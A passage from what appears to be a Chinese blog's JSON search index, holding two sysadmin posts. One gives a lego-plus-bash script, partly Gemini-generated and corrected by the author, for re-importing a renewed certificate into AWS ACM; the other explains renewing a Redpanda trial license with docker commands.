class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eCLOUDFLARE_DNS_API_TOKEN\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"c1\"\u003e######## /usr/local/bin/lego --path /usr/local/bin/certs --email zhangranrui@rendoumi.com --dns cloudflare --domains *.rendoumi.com --domains rendoumi.com renew --renew-hook=\u0026#34;/usr/local/bin/update_aws_cert.sh\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e参数\u003ccode\u003e--renew-hook\u003c/code\u003e如果有新证书，就调用后面的脚本。如果没有新证书，就无操作，避免无用功。\u003c/p\u003e\n\u003cp\u003e然后再写好 update_aws_cert.sh，这就是个千字文了，由gemini生成的：\u003c/p\u003e\n\u003cp\u003e由于lego生成的crt是证书+证书链，所以第一步要把证书部分给单独拆出来\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /usr/local/bin/certs/certificates\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#首先把证书单独拆出来\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eawk \u003cspan class=\"s1\"\u003e\u0026#39;/-----BEGIN CERTIFICATE-----/,/-----END CERTIFICATE-----/ {print} /-----END CERTIFICATE-----/ {exit}\u0026#39;\u003c/span\u003e _.rendoumi.com.crt \u0026gt; _.rendoumi.com.only\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# --- 配置部分 ---\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 您要更新的现有 ACM 证书的 ARN\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 示例：CERTIFICATE_ARN=\u0026#34;arn:aws:acm:ap-southeast-1:123456789012:certificate/abcdefab-1234-5678-abcd-1234567890ab\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eCERTIFICATE_ARN\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;arn:aws:acm:ap-southeast-1:111111111111:certificate/11111111-1111-1111-1111-111111111111\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 新证书文件的路径（例如：/opt/certs/new_certificate.crt）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 确保这个路径在您的EC2实例上是正确的\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eCERTIFICATE_BODY_PATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;_.rendoumi.com.only\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 新私钥文件的路径（例如：/opt/certs/private.key）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 确保这个路径在您的EC2实例上是正确的\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003ePRIVATE_KEY_PATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;_.rendoumi.com.key\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 证书链文件的路径（可选）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 如果没有证书链，请将此变量留空或注释掉\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 示例：CERTIFICATE_CHAIN_PATH=\u0026#34;/opt/certs/ca_bundle.crt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eCERTIFICATE_CHAIN_PATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;_.rendoumi.com.issuer.crt\u0026#34;\u003c/span\u003e \u003cspan class=\"c1\"\u003e# 如果没有链，请将其留空 \u0026#34;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ACM 证书所在的 AWS 区域\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 这个区域应该与 CERTIFICATE_ARN 中的区域匹配\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 示例：AWS_REGION=\u0026#34;ap-southeast-1\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eAWS_REGION\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ap-southeast-1\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# --- 配置部分结束 ---\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;--- 开始使用实例角色重新导入 ACM 证书 ---\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;证书 ARN: \u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eCERTIFICATE_ARN\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;区域: \u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eAWS_REGION\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 检查文件是否存在\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e ! -f \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eCERTIFICATE_BODY_PATH\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;错误：证书文件 \u0026#39;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eCERTIFICATE_BODY_PATH\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39; 不存在。\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eexit\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e ! -f \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003ePRIVATE_KEY_PATH\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;错误：私钥文件 \u0026#39;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003ePRIVATE_KEY_PATH\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39; 不存在。\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eexit\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e -n \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eCERTIFICATE_CHAIN_PATH\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e ! -f \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eCERTIFICATE_CHAIN_PATH\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;警告：证书链文件 \u0026#39;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eCERTIFICATE_CHAIN_PATH\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#39; 已指定但不存在。将不包含证书链进行导入。\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eCERTIFICATE_CHAIN_PATH\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e \u003cspan class=\"c1\"\u003e# 如果文件不存在，则清空路径\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 构造 AWS CLI 命令。AWS CLI 会自动使用实例角色提供的凭证。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eIMPORT_CMD\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;aws acm import-certificate \\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e  --certificate-arn \u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eCERTIFICATE_ARN\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e \\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e  --certificate fileb://\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eCERTIFICATE_BODY_PATH\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e \\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e  --private-key fileb://\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003ePRIVATE_KEY_PATH\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e \\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e  --region \\\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eAWS_REGION\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\\\u0026#34;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 如果有证书链，则添加到命令中\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e -n \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eCERTIFICATE_CHAIN_PATH\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eIMPORT_CMD\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eIMPORT_CMD\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e --certificate-chain fileb://\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eCERTIFICATE_CHAIN_PATH\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;正在执行命令：\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$IMPORT_CMD\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;--------------------------\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 执行命令\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 注意：这里我们不指定 --profile 或任何凭证，AWS CLI 会自动使用实例IAM角色。\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eeval\u003c/span\u003e \u003cspan class=\"nv\"\u003e$IMPORT_CMD\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# 检查命令执行结果\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e \u003cspan class=\"nv\"\u003e$?\u003c/span\u003e -eq \u003cspan class=\"m\"\u003e0\u003c/span\u003e \u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;--- 证书重新导入成功！---\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;ACM 证书 \u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eCERTIFICATE_ARN\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e 已更新。\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eelse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;--- 证书重新导入失败！---\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;请检查错误消息，确保：\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;1. EC2 实例已正确附加了具有 acm:ImportCertificate 权限的 IAM 角色。\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;2. 证书、私钥和链文件路径正确且可读。\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;3. 证书/私钥/链的格式正确。\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;--- 脚本执行完毕 ---\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e看起来真的是又臭又长，废话连篇。注意：gemini 生成的代码有问题，aws acm import-certificate 的参数中，证书文件的前缀是fileb://，gemini给的是file://，调试了半天，最后去aws看了文档才发现。\u003c/p\u003e","title":"aws的EC2服务器用lego获得免费证书并更新到ACM"},{"content":"上回我们在 Kafka的测试替代品-Redpanda 中说了怎么搭建，结果用了一个月，问题就来了\nlicense过期了，擦的，只允许用30天，需要续费了。\n方法如下：\n一、打开网站，申请30天的免费license\nhttps://cloud.redpanda.com/try-enterprise\n打开网站，然后填入姓名和邮箱，就会得到一个长字符串xyz，拷贝下来\n二、去机器上\n我们是用docker compose启动的，所以需要进入容器，导入license\ndocker exec -it redpanda-0 /bin/sh rpk cluster license set xyz 三、重启容器\n按道理上一步弄完，就应该好了的，可惜这产品做的稀烂。还必须重启容器才起作用\ndocker compose restart 就ok了，但是30天就更新一次license，而且必须要重启容器，这谁受得了啊。\n下周就抽空装一个不依赖Zookeeper，用Rraft的Kafka来用，彻底去掉这个不伦不类的软件。\n","permalink":"https://rendoumi.com/posts/20250725_redpanda_license/","summary":"\u003cp\u003e上回我们在 \u003ca href=\"/posts/20250516-redpanda/\"\u003eKafka的测试替代品-Redpanda\u003c/a\u003e 中说了怎么搭建，结果用了一个月，问题就来了\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250725132008481\" loading=\"lazy\" src=\"/posts/20250725_redpanda_license/image-20250725132008481.png\"\u003e\u003c/p\u003e\n\u003cp\u003elicense过期了，擦的，只允许用30天，需要续费了。\u003c/p\u003e\n\u003cp\u003e方法如下：\u003c/p\u003e\n\u003cp\u003e一、打开网站，申请30天的免费license\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://cloud.redpanda.com/try-enterprise\"\u003ehttps://cloud.redpanda.com/try-enterprise\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e打开网站，然后填入姓名和邮箱，就会得到一个长字符串xyz，拷贝下来\u003c/p\u003e\n\u003cp\u003e二、去机器上\u003c/p\u003e\n\u003cp\u003e我们是用docker compose启动的，所以需要进入容器，导入license\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker \u003cspan class=\"nb\"\u003eexec\u003c/span\u003e -it redpanda-0 /bin/sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erpk cluster license \u003cspan class=\"nb\"\u003eset\u003c/span\u003e xyz\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e三、重启容器\u003c/p\u003e\n\u003cp\u003e按道理上一步弄完，就应该好了的，可惜这产品做的稀烂。还必须重启容器才起作用\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker compose 